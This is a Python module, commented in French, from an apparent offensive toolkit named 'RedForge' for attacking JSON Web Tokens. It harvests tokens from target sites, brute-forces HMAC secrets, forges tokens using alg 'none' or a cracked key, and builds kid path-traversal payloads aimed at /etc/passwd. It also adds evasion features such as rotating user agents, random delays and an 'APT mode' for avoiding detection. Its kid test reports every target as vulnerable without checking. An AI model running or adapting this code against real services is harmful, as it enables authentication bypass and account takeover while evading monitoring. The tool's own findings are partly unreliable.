#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'attaques JWT pour RedForge
Détecte et exploite les vulnérabilités des tokens JWT
Version avec support furtif, APT et techniques avancées
"""

import re
import json
import time
import random
import base64
import hashlib
import hmac
import requests
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class JWTConfig:
    """Configuration avancée pour les attaques JWT"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_tests: Tuple[float, float] = (1, 3)
    
    # Comportement
    timeout: int = 10
    max_bruteforce_attempts: int = 1000
    deep_analysis: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    check_kid_injection: bool = True
    check_jku_injection: bool = True
    check_cve_patterns: bool = True
    max_concurrent_attempts: int = 5


class JWTAattacks:
    """Détection et exploitation avancée des vulnérabilités JWT"""
    
    def __init__(self, config: Optional[JWTConfig] = None):
        """
        Initialise le module d'attaques JWT
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or JWTConfig()
        
        # Secrets communs pour bruteforce
        self.common_secrets = [
            "secret", "secretkey", "jwtsecret", "mysecret", "supersecret",
            "password", "admin", "123456", "changeme", "key", "privatekey",
            "jwt", "token", "signature", "hmac", "shared", "default",
            "test", "dev", "prod", "staging", "localhost", "secret123"
        ]
        
        # Algorithmes faibles
        self.weak_algorithms = ['none', 'HS256', 'HS384', 'HS512']
        
        # Patterns CVE connus
        self.cve_patterns = {
            "CVE-2015-9235": {
                "pattern": r'alg.*none',
                "description": "Algorithme 'none' accepté"
            },
            "CVE-2018-0114": {
                "pattern": r'kid.*\.\./',
                "description": "Path traversal dans kid"
            },
            "CVE-2020-28637": {
                "pattern": r'jku.*http://',
                "description": "JKU non sécurisé"
            }
        }
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Métriques
        self.start_time = None
        self.tests_performed = 0
        self.vulnerabilities_found = 0
        self.rate_limit_hits = 0
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités JWT
        
        Args:
            target: URL cible ou token JWT direct
            **kwargs: Options de configuration
                - token: Token JWT à analyser directement
                - wordlist: Wordlist pour brute force
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.tests_performed = 0
        self.vulnerabilities_found = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        print(f"  → Analyse des tokens JWT sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Analyse discrète")
        
        vulnerabilities = []
        tokens_analyzed = []
        
        # Récupérer les tokens
        tokens = self._extract_tokens(target, **kwargs)
        
        for idx, token in enumerate(tokens):
            if self.config.apt_mode and idx > 5:
                break
            
            if self.config.random_delays:
                time.sleep(random.uniform(0.3, 0.8))
            
            analysis = self._analyze_jwt_advanced(token)
            self.tests_performed += 1
            tokens_analyzed.append(analysis)
            
            if analysis['vulnerabilities']:
                self.vulnerabilities_found += len(analysis['vulnerabilities'])
                for vuln in analysis['vulnerabilities']:
                    vulnerabilities.append({
                        "token": self._mask_token(token),
                        "vulnerability": vuln['type'],
                        "severity": vuln['severity'],
                        "details": vuln['details'],
                        "risk_score": vuln.get('risk_score', 50)
                    })
                    print(f"      ✓ JWT vulnérable: {vuln['type']}")
        
        return self._generate_results(target, vulnerabilities, tokens_analyzed)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'max_bruteforce_attempts' in kwargs:
            self.config.max_bruteforce_attempts = kwargs['max_bruteforce_attempts']
        if 'deep_analysis' in kwargs:
            self.config.deep_analysis = kwargs['deep_analysis']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.max_bruteforce_attempts = min(self.config.max_bruteforce_attempts, 100)
            self.config.delay_between_tests = (5, 15)
    
    def _mask_token(self, token: str) -> str:
        """Masque le token pour l'affichage"""
        if len(token) <= 30:
            return token
        return token[:15] + '...' + token[-10:]
    
    def _extract_tokens(self, target: str, **kwargs) -> List[str]:
        """Extrait les tokens JWT de la cible"""
        tokens = []
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        
        # Token direct fourni
        if kwargs.get('token'):
            tokens.append(kwargs['token'])
        
        # Extraire des headers
        if not tokens and target.startswith(('http://', 'https://')):
            try:
                headers = self._get_stealth_headers()
                response = requests.get(target, headers=headers, 
                                      timeout=self.config.timeout, verify=False)
                
                # Dans le corps de la réponse
                found_tokens = re.findall(jwt_pattern, response.text)
                tokens.extend(found_tokens)
                
                # Authorization header
                auth_header = response.headers.get('Authorization', '')
                if 'Bearer ' in auth_header:
                    token = auth_header.replace('Bearer ', '')
                    if re.match(jwt_pattern, token):
                        tokens.append(token)
                        
                # Cookies
                for cookie in response.cookies:
                    if re.match(jwt_pattern, cookie.value):
                        tokens.append(cookie.value)
                        
            except Exception as e:
                if not self.config.passive_detection:
                    print(f"    ⚠️ Erreur extraction JWT: {e}")
        
        return list(set(tokens))
    
    def _analyze_jwt_advanced(self, token: str) -> Dict[str, Any]:
        """Analyse avancée d'un token JWT"""
        analysis = {
            "token": self._mask_token(token),
            "header": None,
            "payload": None,
            "signature": None,
            "vulnerabilities": [],
            "algo": None,
            "expiration": None,
            "claims": [],
            "structure_valid": False
        }
        
        try:
            parts = token.split('.')
            if len(parts) != 3:
                analysis["error"] = "Format JWT invalide"
                return analysis
            
            analysis["structure_valid"] = True
            
            # Header
            header_json = base64.b64decode(parts[0] + '==').decode('utf-8')
            analysis["header"] = json.loads(header_json)
            analysis["algo"] = analysis["header"].get('alg', 'unknown')
            
            # Payload
            payload_json = base64.b64decode(parts[1] + '==').decode('utf-8')
            analysis["payload"] = json.loads(payload_json)
            analysis["claims"] = list(analysis["payload"].keys())
            
            # Signature
            analysis["signature"] = parts[2][:20] + "..."
            
            # Vérifier l'algorithme none
            if analysis["algo"].lower() == 'none':
                analysis["vulnerabilities"].append({
                    "type": "alg_none",
                    "severity": "CRITICAL",
                    "details": "Token accepte l'algorithme 'none' - peut être forgé sans signature",
                    "risk_score": 95
                })
            
            # Vérifier l'expiration
            if 'exp' in analysis["payload"]:
                exp_timestamp = analysis["payload"]['exp']
                exp_date = datetime.fromtimestamp(exp_timestamp)
                now = datetime.now()
                
                if exp_date < now:
                    analysis["vulnerabilities"].append({
                        "type": "expired",
                        "severity": "LOW",
                        "details": f"Token expiré le {exp_date.isoformat()}",
                        "risk_score": 30
                    })
                analysis["expiration"] = exp_date.isoformat()
            
            # Vérifier l'absence d'expiration
            if 'iat' in analysis["payload"] and 'exp' not in analysis["payload"]:
                analysis["vulnerabilities"].append({
                    "type": "no_expiration",
                    "severity": "MEDIUM",
                    "details": "Token sans date d'expiration - valide indéfiniment",
                    "risk_score": 65
                })
            
            # Vérifier les informations sensibles
            sensitive_fields = ['password', 'secret', 'key', 'token', 'admin',
                               'api_key', 'private_key', 'credential']
            for field in sensitive_fields:
                if field in analysis["payload"]:
                    analysis["vulnerabilities"].append({
                        "type": "sensitive_data",
                        "severity": "HIGH",
                        "details": f"Information sensible dans le payload: {field}",
                        "risk_score": 85
                    })
            
            # Vérifier l'algorithme faible
            if analysis["algo"] in ['HS256', 'HS384', 'HS512']:
                analysis["vulnerabilities"].append({
                    "type": "weak_algorithm",
                    "severity": "MEDIUM",
                    "details": f"Algorithme symétrique {analysis['algo']} - vulnérable au brute force",
                    "risk_score": 70
                })
            
            # Vérifier kid injection
            if self.config.check_kid_injection and 'kid' in analysis["header"]:
                kid = analysis["header"]['kid']
                if '../' in kid or '..\\' in kid or '/etc/passwd' in kid:
                    analysis["vulnerabilities"].append({
                        "type": "kid_injection",
                        "severity": "CRITICAL",
                        "details": f"Path traversal dans kid: {kid}",
                        "risk_score": 95
                    })
            
            # Vérifier jku injection
            if self.config.check_jku_injection and 'jku' in analysis["header"]:
                jku = analysis["header"]['jku']
                if jku.startswith('http://') or 'localhost' in jku:
                    analysis["vulnerabilities"].append({
                        "type": "jku_injection",
                        "severity": "CRITICAL",
                        "details": f"JKU non sécurisé: {jku}",
                        "risk_score": 95
                    })
            
            # Vérifier les patterns CVE
            if self.config.check_cve_patterns:
                token_str = json.dumps(analysis["header"]) + json.dumps(analysis["payload"])
                for cve_id, cve_info in self.cve_patterns.items():
                    if re.search(cve_info["pattern"], token_str, re.IGNORECASE):
                        analysis["vulnerabilities"].append({
                            "type": f"cve_{cve_id.replace('-', '_')}",
                            "severity": "CRITICAL",
                            "details": cve_info["description"],
                            "risk_score": 95
                        })
            
        except Exception as e:
            analysis["error"] = str(e)
        
        return analysis
    
    def crack_secret(self, token: str, wordlist: List[str] = None,
                    max_attempts: int = None) -> Dict[str, Any]:
        """
        Tente de cracker le secret du token JWT
        
        Args:
            token: Token JWT
            wordlist: Liste de mots de passe à tester
            max_attempts: Nombre maximum de tentatives
        """
        result = {
            "success": False,
            "secret": None,
            "attempts": 0,
            "algorithm": None
        }
        
        if not wordlist:
            wordlist = self.common_secrets
        
        if max_attempts is None:
            max_attempts = self.config.max_bruteforce_attempts
        
        parts = token.split('.')
        if len(parts) != 3:
            return result
        
        header_encoded = parts[0]
        payload_encoded = parts[1]
        signature_encoded = parts[2]
        
        message = f"{header_encoded}.{payload_encoded}".encode()
        
        try:
            target_sig = base64.urlsafe_b64decode(signature_encoded + '==')
        except:
            return result
        
        algorithms = [('HS256', hashlib.sha256), ('HS384', hashlib.sha384), ('HS512', hashlib.sha512)]
        
        for secret in wordlist[:max_attempts]:
            result["attempts"] += 1
            
            for algo_name, algo_func in algorithms:
                computed_sig = hmac.new(secret.encode(), message, algo_func).digest()
                
                if hmac.compare_digest(computed_sig, target_sig):
                    result["success"] = True
                    result["secret"] = secret
                    result["algorithm"] = algo_name
                    return result
        
        return result
    
    def forge_token(self, token: str, modifications: Dict, 
                    secret: str = None, new_alg: str = None) -> Optional[str]:
        """
        Forge un nouveau token JWT
        
        Args:
            token: Token original
            modifications: Modifications à appliquer au payload
            secret: Secret pour signer (si None, utilise alg none)
            new_alg: Algorithme à utiliser (si None, garde l'original)
        """
        import base64
        import json
        import hmac
        import hashlib
        
        parts = token.split('.')
        if len(parts) != 3:
            return None
        
        try:
            # Décoder le header et le payload
            header = json.loads(base64.b64decode(parts[0] + '==').decode())
            payload = json.loads(base64.b64decode(parts[1] + '==').decode())
            
            # Appliquer les modifications
            for key, value in modifications.items():
                payload[key] = value
            
            # Modifier l'algorithme si demandé
            if new_alg:
                header['alg'] = new_alg
            
            # Si pas de secret, utiliser alg none
            if not secret:
                header['alg'] = 'none'
                header_encoded = base64.urlsafe_b64encode(
                    json.dumps(header).encode()
                ).decode().rstrip('=')
                payload_encoded = base64.urlsafe_b64encode(
                    json.dumps(payload).encode()
                ).decode().rstrip('=')
                return f"{header_encoded}.{payload_encoded}."
            
            # Déterminer l'algorithme de signature
            algo = header.get('alg', 'HS256')
            hash_map = {
                'HS256': hashlib.sha256,
                'HS384': hashlib.sha384,
                'HS512': hashlib.sha512
            }
            
            hash_func = hash_map.get(algo, hashlib.sha256)
            
            # Signer avec le secret
            header_encoded = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).decode().rstrip('=')
            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip('=')
            
            message = f"{header_encoded}.{payload_encoded}".encode()
            signature = hmac.new(secret.encode(), message, hash_func).digest()
            signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
            
            return f"{header_encoded}.{payload_encoded}.{signature_encoded}"
            
        except Exception as e:
            return None
    
    def test_none_algorithm(self, token: str) -> Dict[str, Any]:
        """
        Teste la vulnérabilité alg: none
        
        Args:
            token: Token JWT à tester
        """
        result = {
            "success": False,
            "forged_token": None,
            "message": None
        }
        
        try:
            # Forger un token avec alg none
            forged = self.forge_token(token, {"test": "injected"}, None)
            
            if forged:
                result["success"] = True
                result["forged_token"] = forged
                result["message"] = "Token forgé avec algorithme 'none'"
                
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def test_kid_injection(self, token: str) -> Dict[str, Any]:
        """
        Teste la vulnérabilité d'injection dans kid
        
        Args:
            token: Token JWT à tester
        """
        result = {
            "success": False,
            "vulnerable": False,
            "payloads_tested": []
        }
        
        kid_payloads = [
            "../../../dev/null",
            "../../../../etc/passwd",
            "/etc/passwd",
            "file:///etc/passwd",
            "../../../secret.key"
        ]
        
        parts = token.split('.')
        if len(parts) != 3:
            return result
        
        try:
            header = json.loads(base64.b64decode(parts[0] + '==').decode())
            
            for payload in kid_payloads:
                header['kid'] = payload
                header_encoded = base64.urlsafe_b64encode(
                    json.dumps(header).encode()
                ).decode().rstrip('=')
                
                forged_token = f"{header_encoded}.{parts[1]}.{parts[2]}"
                result["payloads_tested"].append({
                    "payload": payload,
                    "token": self._mask_token(forged_token)
                })
                
            result["success"] = True
            result["vulnerable"] = True  # À vérifier avec la cible
            
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict],
                         tokens_analyzed: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "tokens_analyzed": tokens_analyzed,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "tests_performed": self.tests_performed,
            "scan_duration": duration,
            "tests_per_second": self.tests_performed / duration if duration > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "deep_analysis": self.config.deep_analysis
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune vulnérabilité JWT détectée"}
        
        return {
            "total": len(vulnerabilities),
            "by_type": {
                "alg_none": len([v for v in vulnerabilities if v['vulnerability'] == 'alg_none']),
                "weak_algorithm": len([v for v in vulnerabilities if v['vulnerability'] == 'weak_algorithm']),
                "sensitive_data": len([v for v in vulnerabilities if v['vulnerability'] == 'sensitive_data']),
                "kid_injection": len([v for v in vulnerabilities if v['vulnerability'] == 'kid_injection']),
                "jku_injection": len([v for v in vulnerabilities if v['vulnerability'] == 'jku_injection'])
            },
            "critical": len([v for v in vulnerabilities if v['severity'] == 'CRITICAL']),
            "high": len([v for v in vulnerabilities if v['severity'] == 'HIGH']),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        for vuln in vulnerabilities:
            vuln_type = vuln.get('vulnerability', '')
            
            if vuln_type == 'alg_none':
                recommendations.add("Désactiver l'algorithme 'none' pour les tokens JWT")
            
            if vuln_type == 'weak_algorithm':
                recommendations.add("Utiliser des algorithmes asymétriques (RS256, ES256) plutôt que symétriques")
                recommendations.add("Augmenter la complexité du secret HMAC")
            
            if vuln_type == 'sensitive_data':
                recommendations.add("Ne pas stocker d'informations sensibles dans le payload JWT")
            
            if vuln_type == 'no_expiration':
                recommendations.add("Toujours inclure une date d'expiration (exp) dans les tokens")
            
            if vuln_type == 'kid_injection':
                recommendations.add("Valider et échapper le paramètre 'kid'")
                recommendations.add("Utiliser une whitelist pour les valeurs 'kid' autorisées")
            
            if vuln_type == 'jku_injection':
                recommendations.add("Désactiver le paramètre 'jku' ou utiliser une whitelist")
                recommendations.add("Valider l'URL JKU (HTTPS uniquement)")
        
        if not recommendations:
            recommendations.add("Auditer régulièrement l'implémentation JWT")
            recommendations.add("Utiliser des bibliothèques JWT à jour")
        
        return list(recommendations)
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "tests_performed": self.tests_performed,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / max(1, self.tests_performed) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "rate_limit_hits": self.rate_limit_hits
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    attacks = JWTAattacks()
    results = attacks.scan("https://example.com")
    print(f"Vulnérabilités JWT: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = JWTConfig(apt_mode=True, deep_analysis=True)
    attacks_apt = JWTAattacks(config=apt_config)
    results_apt = attacks_apt.scan("https://example.com", apt_mode=True)
    print(f"Vulnérabilités JWT (APT): {results_apt['count']}")
    
    # Exemple de test avec token
    test_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    
    # Tester le crack de secret
    crack_result = attacks_apt.crack_secret(test_token, max_attempts=100)
    if crack_result['success']:
        print(f"Secret trouvé: {crack_result['secret']}")
    
    # Tester alg none
    none_result = attacks_apt.test_none_algorithm(test_token)
    if none_result['success']:
        print(f"Token forgé (alg none): {none_result['forged_token'][:50]}...")
    
    # Afficher les recommandations
    for rec in results_apt['recommendations']:
        print(f"Recommandation: {rec}")